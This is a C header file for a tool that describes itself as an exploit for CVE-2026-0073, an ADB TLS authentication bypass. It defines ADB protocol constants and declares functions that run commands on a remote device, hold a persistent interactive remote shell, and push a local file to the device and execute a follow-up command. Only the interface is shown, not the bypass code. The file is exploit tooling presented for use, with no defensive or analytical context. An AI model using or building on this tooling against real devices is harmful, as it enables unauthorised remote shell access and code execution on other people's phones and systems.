/*
 * adb0073.h - CVE-2026-0073 ADB TLS auth bypass (C implementation)
 */
#ifndef ADB0073_H
#define ADB0073_H

#include <stddef.h>

#define ADB_VERSION    0x01000001u
#define ADB_MAXDATA    (256u * 1024u)
#define DELAYED_ACK_WINDOW (32u * 1024u * 1024u)

#define CMD_CNXN 0x4e584e43u
#define CMD_STLS 0x534c5453u
#define CMD_AUTH 0x41555448u
#define CMD_OPEN 0x4e45504fu
#define CMD_OKAY 0x59414b4fu
#define CMD_WRTE 0x45545257u
#define CMD_CLSE 0x45534c43u

#define ADB_BANNER "host::features=shell_v2,cmd,stat_v2,ls_v2,fixed_push_mkdir,apex,abb,fixed_push_symlink_timestamp,abb_exec,remount_shell,track_app,sendrecv_v2,sendrecv_v2_brotli,sendrecv_v2_lz4,sendrecv_v2_zstd,sendrecv_v2_dry_run_send,openscreen_mdns,delayed_ack"

int adb0073_run(const char *host, int port, const char *cmd, char *out, size_t outsz);
extern int adb0073_verbose;

#endif

/*
 * Extended API: open a persistent shell session and interact.
 * The callback is invoked once the stream is up; it receives a context
 * pointer and a "send" function that writes raw bytes to the remote stdin.
 *
 * Returns 0 on success.
 */
typedef int (*adb0073_send_fn)(void *ctx, const void *buf, size_t len);

typedef struct {
    /* called repeatedly while the remote shell is alive.
     * return 0 to keep going, non-zero to stop. */
    int (*on_ready)(void *ctx, adb0073_send_fn send_fn, void *send_ctx);
    void *ctx;
} adb0073_session;

int adb0073_run_session(const char *host, int port, const char *cmd,
                        adb0073_session *sess, char *out, size_t outsz);

/*
 * High level helper: push a local file to a remote path (via `cat > path`),
 * then run a command. Both happen inside ONE shell session.
 */
int adb0073_push_and_run(const char *host, int port,
                         const char *local_path, const char *remote_path,
                         const char *post_cmd,
                         char *out, size_t outsz);
